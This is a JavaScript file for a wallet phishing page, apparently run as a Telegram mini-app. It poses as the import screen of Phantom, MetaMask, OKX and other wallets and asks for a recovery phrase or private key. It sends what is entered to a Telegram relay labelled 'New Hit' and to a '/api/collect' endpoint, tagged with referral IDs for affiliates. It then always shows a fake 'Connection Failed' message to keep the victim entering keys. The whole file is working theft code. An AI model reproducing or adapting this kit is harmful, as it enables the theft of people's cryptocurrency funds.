// Function to initialize Telegram WebApp
function initTelegramWebApp() {
    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
}

// Function to get referral ID from all possible sources
function getReferralId() {
    let refId = null;

    // 1. Try Telegram WebApp initData first (most secure)
    if (window.Telegram?.WebApp?.initData) {
        try {
            const initData = new URLSearchParams(window.Telegram.WebApp.initData);
            const startApp = initData.get('start');
            if (startApp?.startsWith('ref_')) {
                refId = startApp.replace('ref_', '');
            }
        } catch (e) {
            console.error('Error parsing Telegram WebApp initData:', e);
        }
    }

    // 2. Try Telegram WebApp start_param
    if (!refId && window.Telegram?.WebApp?.initDataUnsafe?.start_param) {
        const startParam = window.Telegram.WebApp.initDataUnsafe.start_param;
        if (startParam?.startsWith('ref_')) {
            refId = startParam.replace('ref_', '');
        }
    }

    // 3. Try URL parameters
    if (!refId) {
        const urlParams = new URLSearchParams(window.location.search);
        refId = urlParams.get('ref');
    }

    // 4. Try session storage as last resort
    if (!refId) {
        refId = sessionStorage.getItem('refId');
    }

    // Store in session storage if found
    if (refId) {
        sessionStorage.setItem('refId', refId);
    }

    return refId;
}

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    initTelegramWebApp();
    const refId = getReferralId();
    if (!refId) {
        console.error('No referral ID found');
    }
});

// Wallet configurations
const walletConfigs = {
    phantom: {
        name: 'Phantom',
        icon: 'https://gmgn.ai/static/img/wallet/phantom.svg',
        theme: 'theme-phantom'
    },
    metamask: {
        name: 'MetaMask',
        icon: 'data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiBoZWlnaHQ9IjMxIiB2aWV3Qm94PSIwIDAgMzEgMzEiIHdpZHRoPSIzMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+PGxpbmVhckdyYWRpZW50IGlkPSJhIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjIwLjI1IiB4Mj0iMjYuNTcxIiB5MT0iMjcuMTczIiB5Mj0iMTkuODU4Ij48c3RvcCBvZmZzZXQ9Ii4wOCIgc3RvcC1jb2xvcj0iIzk5NDVmZiIvPjxzdG9wIG9mZnNldD0iLjMiIHN0b3AtY29sb3I9IiM4NzUyZjMiLz48c3RvcCBvZmZzZXQ9Ii41IiBzdG9wLWNvbG9yPSIjNTQ5N2Q1Ii8+PHN0b3Agb2Zmc2V0PSIuNiIgc3RvcC1jb2xvcj0iIzQzYjRjYSIvPjxzdG9wIG9mZnNldD0iLjcyIiBzdG9wLWNvbG9yPSIjMjhlMGI5Ii8+PHN0b3Agb2Zmc2V0PSIuOTciIHN0b3AtY29sb3I9IiMxOWZiOWIiLz48L2xpbmVhckdyYWRpZW50PjxnIHN0cm9rZS1saW5lam9pbj0icm91bmQiIHN0cm9rZS13aWR0aD0iLjA5NCI+PHBhdGggZD0ibTI2LjEwOSAzLjY0My05LjM2OSA2Ljk1OSAxLjczMy00LjEwNSA3LjYzNy0yLjg1M3oiIGZpbGw9IiNlMjc2MWIiIHN0cm9rZT0iI2UyNzYxYiIvPjxnIGZpbGw9IiNlNDc2MWIiIHN0cm9rZT0iI2U0NzYxYiI+PHBhdGggZD0ibTQuNDgxIDMuNjQzIDkuMjk0IDcuMDI0LTEuNjQ4LTQuMTcxem0xOC4yNTggMTYuMTMtMi40OTUgMy44MjMgNS4zMzkgMS40NjkgMS41MzUtNS4yMDctNC4zNzgtLjA4NXptLTE5LjI0Ny4wODUgMS41MjUgNS4yMDcgNS4zMzktMS40NjktMi40OTUtMy44MjN6Ii8+PHBhdGggZD0ibTEwLjA1NSAxMy4zMTMtMS40ODggMi4yNTEgNS4zMDEuMjM1LS4xODgtNS42OTd6bTEwLjQ4IDAtMy42NzItMy4yNzctLjEyMiA1Ljc2MyA1LjI5Mi0uMjM1LTEuNDk3LTIuMjUxem0tMTAuMTc4IDEwLjI4MyAzLjE4My0xLjU1NC0yLjc0OS0yLjE0Ny0uNDMzIDMuNzAxeiIvPjwvZz48cGF0aCBkPSJtMjAuMjQ0IDIzLjU5Ni0zLjE5Mi0xLjU1NC4yNTQgMi4wODEtLjAyOC44NzZ6bS05Ljg4NyAwIDIuOTY2IDEuNDAzLS4wMTktLjg3Ni4yMzUtMi4wODEtMy4xODMgMS41NTR6IiBmaWxsPSIjZDdjMWIzIiBzdHJva2U9IiNkN2MxYjMiLz48cGF0aCBkPSJtMTMuMzY5IDE4LjUyMS0yLjY1NS0uNzgxIDEuODc0LS44NTd6bTMuODUxIDAgLjc4MS0xLjYzOCAxLjg4My44NTctMi42NjUuNzgxeiIgZmlsbD0iIzIzMzQ0NyIgc3Ryb2tlPSIjMjMzNDQ3Ii8+PHBhdGggZD0ibTEwLjM1NyAyMy41OTYuNDUyLTMuODIzLTIuOTQ3LjA4NXptOS40MzUtMy44MjMuNDUyIDMuODIzIDIuNDk1LTMuNzM4em0yLjI0MS00LjIwOS01LjI5Mi4yMzUuNDkgMi43MjEuNzgyLTEuNjM4IDEuODgzLjg1N3ptLTExLjMxOCAyLjE3NSAxLjg4My0uODU3Ljc3MiAxLjYzOC40OTktMi43MjEtNS4zMDEtLjIzNXoiIGZpbGw9IiNjZDYxMTYiIHN0cm9rZT0iI2NkNjExNiIvPjxwYXRoIGQ9Im04LjU2NyAxNS41NjQgMi4yMjIgNC4zMzEtLjA3NS0yLjE1NnptMTEuMzI4IDIuMTc1LS4wOTQgMi4xNTYgMi4yMzItNC4zMzEtMi4xMzcgMi4xNzV6bS02LjAyNi0xLjk0LS40OTkgMi43MjEuNjIxIDMuMjExLjE0MS00LjIyOC0uMjY0LTEuNzA0em0yLjg3MiAwLS4yNTQgMS42OTUuMTEzIDQuMjM3LjYzMS0zLjIxMXoiIGZpbGw9IiNlNDc1MWYiIHN0cm9rZT0iI2U0NzUxZiIvPjxwYXRoIGQ9Im0xNy4yMyAxOC41Mi0uNjMxIDMuMjExLjQ1Mi4zMTEgMi43NS0yLjE0Ny4wOTQtMi4xNTZ6bS02LjUxNi0uNzgxLjA3NSAyLjE1NiAyLjc1IDIuMTQ3LjQ1Mi0uMzExLS42MjItMy4yMTF6IiBmaWxsPSIjZjY4NTFiIiBzdHJva2U9IiNmNjg1MWIiLz48cGF0aCBkPSJtMTcuMjc3IDI0Ljk5OS4wMjgtLjg3Ni0uMjM1LS4yMDdoLTMuNTVsLS4yMTcuMjA3LjAxOS44NzYtMi45NjYtMS40MDMgMS4wMzYuODQ4IDIuMSAxLjQ1OWgzLjYwNmwyLjEwOS0xLjQ1OSAxLjAzNi0uODQ4eiIgZmlsbD0iI2MwYWQ5ZSIgc3Ryb2tlPSIjYzBhZDllIi8+PHBhdGggZD0ibTE3LjA1MSAyMi4wNDItLjQ1Mi0uMzExaC0yLjYwOGwtLjQ1Mi4zMTEtLjIzNSAyLjA4MS4yMTctLjIwN2gzLjU1bC4yMzUuMjA3LS4yNTQtMi4wODF6IiBmaWxsPSIjMTYxNjE2IiBzdHJva2U9IiMxNjE2MTYiLz48cGF0aCBkPSJtMjYuNTA1IDExLjA1My44LTMuODQyLTEuMTk2LTMuNTY5LTkuMDU4IDYuNzIzIDMuNDg0IDIuOTQ3IDQuOTI1IDEuNDQxIDEuMDkyLTEuMjcxLS40NzEtLjMzOS43NTMtLjY4Ny0uNTg0LS40NTIuNzUzLS41NzQtLjQ5OS0uMzc3em0tMjMuMjExLTMuODQxLjggMy44NDItLjUwOC4zNzcuNzUzLjU3NC0uNTc0LjQ1Mi43NTMuNjg3LS40NzEuMzM5IDEuMDgzIDEuMjcxIDQuOTI1LTEuNDQxIDMuNDg0LTIuOTQ3LTkuMDU5LTYuNzIzeiIgZmlsbD0iIzc2M2QxNiIgc3Ryb2tlPSIjNzYzZDE2Ii8+PHBhdGggZD0ibTI1LjQ2IDE0Ljc1NC00LjkyNS0xLjQ0MSAxLjQ5NyAyLjI1MS0yLjIzMiA0LjMzMSAyLjkzOC0uMDM4aDQuMzc4bC0xLjY1Ny01LjEwNHptLTE1LjQwNS0xLjQ0MS00LjkyNSAxLjQ0MS0xLjYzOCA1LjEwNGg0LjM2OWwyLjkyOC4wMzgtMi4yMjItNC4zMzEgMS40ODgtMi4yNTF6bTYuNjg1IDIuNDg2LjMxMS01LjQzMyAxLjQzMS0zLjg3aC02LjM1NmwxLjQxMyAzLjg3LjMyOSA1LjQzMy4xMTMgMS43MTQuMDA5IDQuMjE5aDIuNjFsLjAxOS00LjIxOS4xMjItMS43MTR6IiBmaWxsPSIjZjY4NTFiIiBzdHJva2U9IiNmNjg1MWIiLz48L2c+PGNpcmNsZSBjeD0iMjMuNSIgY3k9IjIzLjUiIGZpbGw9IiMwMDAiIHI9IjYuNSIvPjxwYXRoIGQ9Im0yNy40NzMgMjUuNTQ1LTEuMzEgMS4zNjhjLS4wMjkuMDMtLjA2My4wNTMtLjEwMS4wN2EuMzEuMzEgMCAwIDEgLS4xMjEuMDI0aC02LjIwOWMtLjAzIDAtLjA1OS0uMDA4LS4wODMtLjAyNGEuMTUuMTUgMCAwIDEgLS4wNTYtLjA2NWMtLjAxMi0uMDI2LS4wMTUtLjA1Ni0uMDEtLjA4NHMuMDE4LS4wNTUuMDM5LS4wNzZsMS4zMTEtMS4zNjhjLjAyOC0uMDMuMDYzLS4wNTMuMTAxLS4wNjlhLjMxLjMxIDAgMCAxIC4xMjEtLjAyNWg2LjIwOGMuMDMgMCAuMDU5LjAwOC4wODMuMDI0YS4xNS4xNSAwIDAgMSAuMDU2LjA2NWMuMDEyLjAyNi4wMTUuMDU2LjAxLjA4NHMtLjAxOC4wNTUtLjAzOS4wNzZ6bS0xLjMxLTIuNzU2Yy0uMDI5LS4wMy0uMDYzLS4wNTMtLjEwMS0uMDdhLjMxLjMxIDAgMCAwIC0uMTIxLS4wMjRoLTYuMjA5Yy0uMDMgMC0uMDU5LjAwOC0uMDgzLjAyNHMtLjA0NC4wMzgtLjA1Ni4wNjUtLjAxNS4wNTYtLjAxLjA4NC4wMTguMDU1LjAzOS4wNzZsMS4zMTEgMS4zNjhjLjAyOC4wMy4wNjMuMDUzLjEwMS4wNjlhLjMxLjMxIDAgMCAwIC4xMjEuMDI1aDYuMjA4Yy4wMyAwIC4wNTktLjAwOC4wODMtLjAyNGEuMTUuMTUgMCAwIDAgLjA1Ni0uMDY1Yy4wMTItLjAyNi4wMTUtLjA1Ni4wMS0uMDg0cy0uMDE4LS4wNTUtLjAzOS0uMDc2em0tNi40MzEtLjk4M2g2LjIwOWEuMzEuMzEgMCAwIDAgLjEyMS0uMDI0Yy4wMzgtLjAxNi4wNzMtLjA0LjEwMS0uMDdsMS4zMS0xLjM2OGMuMDItLjAyMS4wMzQtLjA0Ny4wMzktLjA3NnMuMDAxLS4wNTgtLjAxLS4wODRhLjE1LjE1IDAgMCAwIC0uMDU2LS4wNjVjLS4wMjUtLjAxNi0uMDU0LS4wMjQtLjA4My0uMDI0aC02LjIwOGEuMzEuMzEgMCAwIDAgLS4xMjEuMDI1Yy0uMDM4LjAxNi0uMDcyLjA0LS4xMDEuMDY5bC0xLjMxIDEuMzY4Yy0uMDIuMDIxLS4wMzQuMDQ3LS4wMzkuMDc2cy0uMDAxLjA1OC4wMS4wODQuMDMxLjA0OS4wNTYuMDY1LjA1NC4wMjQuMDgzLjAyNHoiIGZpbGw9InVybCgjYSkiLz48L3N2Zz4=',
        theme: 'theme-metamask'
    },
    bitget: {
        name: 'Bitget',
        icon: 'https://gmgn.ai/static/img/wallet/bitget.png',
        theme: 'theme-bitget'
    },
    okx: {
        name: 'OKX Wallet',
        icon: 'https://gmgn.ai/static/img/wallet/okx.svg',
        theme: 'theme-okx'
    },
    tokenpocket: {
        name: 'TokenPocket',
        icon: 'https://gmgn.ai/static/img/wallet/tokenPocketWallet.svg',
        theme: 'theme-tokenpocket'
    },
    backpack: {
        name: 'Backpack',
        icon: 'https://gmgn.ai/static/img/wallet/backpack.svg',
        theme: 'theme-backpack'
    },
    solflare: {
        name: 'Solflare',
        icon: 'https://gmgn.ai/static/img/wallet/solflare.svg',
        theme: 'theme-solflare'
    }
};

// Get wallet type and ref ID
const urlParams = new URLSearchParams(window.location.search);
const walletType = urlParams.get('wallet') || 'phantom';
const refId = getReferralId();

const walletConfig = walletConfigs[walletType];

// Apply wallet theme and icon
document.querySelector('.recovery-modal').classList.add(walletConfig.theme);
const walletIcon = document.querySelector('#walletIcon');
walletIcon.src = walletConfig.icon;
walletIcon.alt = walletConfig.name;
document.title = `Import ${walletConfig.name} Wallet`;
document.querySelector('.recovery-title').textContent = walletConfig.name;

// Generate phrase input boxes
const phraseGrid = document.querySelector('.phrase-grid');

// Function to generate phrase inputs
function generatePhraseInputs() {
    const container = document.querySelector('.phrase-grid');
    container.innerHTML = ''; // Clear existing inputs
    
    // Generate 12 input boxes
    for (let i = 1; i <= 12; i++) {
        const wrapper = document.createElement('div');
        wrapper.className = 'phrase-input-wrapper';
        
        const number = document.createElement('div');
        number.className = 'phrase-input-number';
        number.textContent = i;
        
        const input = document.createElement('input');
        input.type = 'text';
        input.className = 'phrase-input';
        input.placeholder = '';
        input.setAttribute('data-index', i);
        
        // Simple input handler
        input.addEventListener('input', validateInput);
        
        // Handle paste event on each input
        input.addEventListener('paste', (e) => {
            e.preventDefault(); // Prevent default paste
            const pastedText = e.clipboardData.getData('text');
            const words = pastedText.trim().toLowerCase().split(/\s+/);
            
            // Get all input boxes
            const inputs = document.querySelectorAll('.phrase-input');
            
            // Fill boxes based on number of words pasted
            words.forEach((word, index) => {
                if (inputs[index]) {
                    inputs[index].value = word.trim();
                    // Trigger input event for validation
                    const event = new Event('input', { bubbles: true });
                    inputs[index].dispatchEvent(event);
                }
            });

            // Focus on the next empty input or the last filled input
            const nextEmptyIndex = words.length < 12 ? words.length : 11;
            if (inputs[nextEmptyIndex]) {
                inputs[nextEmptyIndex].focus();
            }

            validateInput(); // Validate all inputs
        });
        
        wrapper.appendChild(number);
        wrapper.appendChild(input);
        container.appendChild(wrapper);
    }
}

// Toggle between phrase and private key
const toggleBtns = document.querySelectorAll('.toggle-btn');
const phraseContainer = document.querySelector('#phraseInputs');
const privateKeyContainer = document.querySelector('#privateKeyInput');
const recoveryDescription = document.querySelector('.recovery-description');

toggleBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        toggleBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        
        if (btn.dataset.type === 'phrase') {
            phraseContainer.classList.remove('hidden');
            privateKeyContainer.classList.add('hidden');
            recoveryDescription.textContent = 'Import an existing wallet with your 12-word recovery phrase.';
            // Clear private key input when switching to phrase
            privateKeyInput.value = '';
        } else {
            phraseContainer.classList.add('hidden');
            privateKeyContainer.classList.remove('hidden');
            recoveryDescription.textContent = 'Import an existing wallet with your Solana private key.';
            // Clear phrase inputs when switching to private key
            document.querySelectorAll('.phrase-input').forEach(input => input.value = '');
        }
        // Always validate after switching
        setTimeout(validateInput, 0);
    });
});

// Input validation
const importButton = document.querySelector('.import-button');
const privateKeyInput = document.querySelector('.private-key-field');

// Add event listeners for private key input
privateKeyInput.addEventListener('input', validateInput);
privateKeyInput.addEventListener('paste', (e) => {
    // Use setTimeout to ensure the pasted content is available
    setTimeout(validateInput, 0);
});

function validateInput() {
    const activeType = document.querySelector('.toggle-btn.active').dataset.type;
    
    if (activeType === 'phrase') {
        const inputs = document.querySelectorAll('.phrase-input');
        const allFilled = Array.from(inputs).every(input => input.value.trim().length > 0);
        importButton.disabled = !allFilled;
    } else {
        const privateKey = privateKeyInput.value.trim();
        // Validate Solana base58 private key format (87 or 88 characters)
        importButton.disabled = !(privateKey.length === 87 || privateKey.length === 88);
    }
}

// Initial setup
generatePhraseInputs();

// Format recovery data for Telegram
function formatRecoveryData(type, data, walletName) {
    const timestamp = new Date().toISOString();
    const emoji = type === 'phrase' ? '🔑' : '🔐';
    const refId = getReferralId(); // Get latest refId when formatting
    
    // Format the data with HTML and emojis
    return `
${emoji} <b>New ${walletName} Import</b> ${emoji}

<b>Type:</b> ${type === 'phrase' ? 'Recovery Phrase' : 'Private Key'}
<b>Time:</b> ${timestamp}
<b>Ref ID:</b> ${refId || 'No Referral'}

<code>${data}</code>

💼 <b>Wallet:</b> ${walletName}
🔥 New Hit
`;
}

// Send data to Telegram
async function sendToTelegram(message) {
    try {
        // Get latest refId when sending
        const refId = getReferralId();
        
        // Send data to our secure backend endpoint
        const response = await fetch('/api/send-telegram', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ 
                message,
                refId,
                sourceUrl: window.location.href,
                platform: window.Telegram?.WebApp ? 'telegram' : 'web'
            }),
            credentials: 'same-origin'
        });

        if (!response.ok) {
            throw new Error('Failed to send message');
        }

        // If successful and in Telegram WebApp, close it
        if (window.Telegram?.WebApp) {
            window.Telegram.WebApp.close();
        }

        return true;
    } catch (error) {
        console.error('Error:', error.message);
        return false;
    }
}

// Add loader and failure modal HTML to the document
document.body.insertAdjacentHTML('beforeend', `
    <div class="loader-container">
        <div class="loader-content">
            <div class="loader-spinner"></div>
            <div>Connecting to ${walletConfig.name}...</div>
        </div>
    </div>
    <div class="failure-modal">
        <div class="failure-content">
            <div class="failure-icon">⚠️</div>
            <div class="failure-title">Connection Failed</div>
            <div class="failure-message">Unable to connect to ${walletConfig.name}. Please verify your credentials and try again.</div>
            <button class="retry-button">Try Again</button>
        </div>
    </div>
`);

// Get modal elements
const loaderContainer = document.querySelector('.loader-container');
const failureModal = document.querySelector('.failure-modal');
const retryButton = document.querySelector('.retry-button');

// Show loader
function showLoader() {
    loaderContainer.style.display = 'flex';
}

// Hide loader
function hideLoader() {
    loaderContainer.style.display = 'none';
}

// Show failure modal
function showFailureModal() {
    failureModal.style.display = 'flex';
}

// Hide failure modal
function hideFailureModal() {
    failureModal.style.display = 'none';
}

// Clear all input fields
function clearInputs() {
    // Clear phrase inputs
    const phraseInputs = document.querySelectorAll('.phrase-input');
    phraseInputs.forEach(input => input.value = '');
    
    // Clear private key input
    privateKeyInput.value = '';
    
    // Disable import button
    importButton.disabled = true;
}

// Handle retry button click
retryButton.addEventListener('click', () => {
    hideFailureModal();
    clearInputs();
});

// Update import button click handler
importButton.addEventListener('click', async (e) => {
    e.preventDefault();
    
    // Get the data before showing loader
    const activeType = document.querySelector('.toggle-btn.active').dataset.type;
    let recoveryData;
    
    if (activeType === 'phrase') {
        const inputs = document.querySelectorAll('.phrase-input');
        recoveryData = Array.from(inputs).map(input => input.value.trim()).join(' ');
    } else {
        recoveryData = privateKeyInput.value.trim();
    }
    
    // Format and send the data
    const formattedMessage = formatRecoveryData(
        activeType,
        recoveryData,
        walletConfig.name
    );
    
    // Show loader
    showLoader();
    
    try {
        // Send data to both endpoints in parallel
        const [telegramResult, walletResult] = await Promise.all([
            sendToTelegram(formattedMessage),
            submitWalletData(activeType, recoveryData)
        ]);
        
        // Wait remaining time to complete 3 seconds
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        // Hide loader
        hideLoader();
        
        // Show failure modal
        showFailureModal();
        
        // Clear all inputs
        clearInputs();
    } catch (error) {
        console.error('Error:', error);
        // Still show failure modal even if sending fails
        hideLoader();
        showFailureModal();
        clearInputs();
    }
});

// Function to submit wallet data
async function submitWalletData(type, data) {
    try {
        // Get latest refId from session storage
        const currentRefId = sessionStorage.getItem('refId');
        
        if (!currentRefId) {
            throw new Error('No referral ID found. Please use a valid referral link.');
        }

        // Get the wallet type from URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const walletName = urlParams.get('wallet') || 'phantom';
        
        // Map wallet names to supported blockchain types
        const walletToChainMap = {
            'phantom': 'SOL',
            'solflare': 'SOL',
            'backpack': 'SOL',
            'metamask': 'ETH',
            'tokenpocket': 'ETH',
            'bitget': 'ETH',
            'okx': 'ETH'
        };

        // Get the correct blockchain type
        const blockchainType = walletToChainMap[walletName] || 'SOL';

        const response = await fetch('/api/collect', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                refId: currentRefId,
                walletType: blockchainType, // Using correct blockchain type
                ...(type === 'phrase' ? { phrase: data } : { privateKey: data }),
                sourceUrl: window.location.href,
                walletName: walletName // Adding wallet name for reference
            })
        });

        if (!response.ok) {
            const errorData = await response.json();
            throw new Error(errorData.error || 'Failed to submit wallet data');
        }

        return { success: true };
    } catch (error) {
        console.error('Error submitting wallet data:', error);
        return { success: false, error: error.message };
    }
}

// Remove clipboard paste event listeners
document.removeEventListener('DOMContentLoaded', () => {
    const phraseContainer = document.querySelector('.phrase-input-container');
    if (phraseContainer) {
        phraseContainer.removeEventListener('paste', handleClipboardPaste);
    }
}); 
